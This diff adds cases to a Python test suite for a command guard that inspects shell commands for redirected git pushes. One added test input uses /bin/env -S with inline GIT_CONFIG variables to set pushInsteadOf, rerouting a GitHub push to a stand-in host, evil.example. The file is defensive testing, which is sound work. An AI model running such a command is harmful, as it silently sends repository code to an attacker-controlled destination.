@@ -1716,6 +1716,8 @@ def test_explicit_non_github_pushurl_is_not_rewritten(merged_branch_repo, monkey
 	"env --split-string='git push origin HEAD:feature/x'",
 	"env -i -S 'git push origin HEAD:feature/x'",
 	"/usr/bin/env -S 'git push origin HEAD:feature/x'",
+	"/bin/env -S 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin HEAD:feature/x'",
+	"/bin/env --split-string='git push origin HEAD:feature/x'",
 	"env -i /usr/bin/env -S 'git push origin HEAD:feature/x'",
 ])
 def test_unresolvable_inline_config_asks(merged_branch_repo, monkeypatch, capsys, command: str) -> None:
@@ -1729,6 +1731,7 @@ def test_unresolvable_inline_config_asks(merged_branch_repo, monkeypatch, capsys
 def test_non_git_env_split_string_is_ignored(merged_branch_repo, capsys) -> None:
 	repo, _ = merged_branch_repo
 	assert guard.evaluate(_bash_payload("env -S 'printf hello'") | {"cwd": str(repo)}) == (0, "")
+	assert guard.evaluate(_bash_payload("/bin/env -S 'printf hello'") | {"cwd": str(repo)}) == (0, "")
 	assert capsys.readouterr().out == ""
 
 
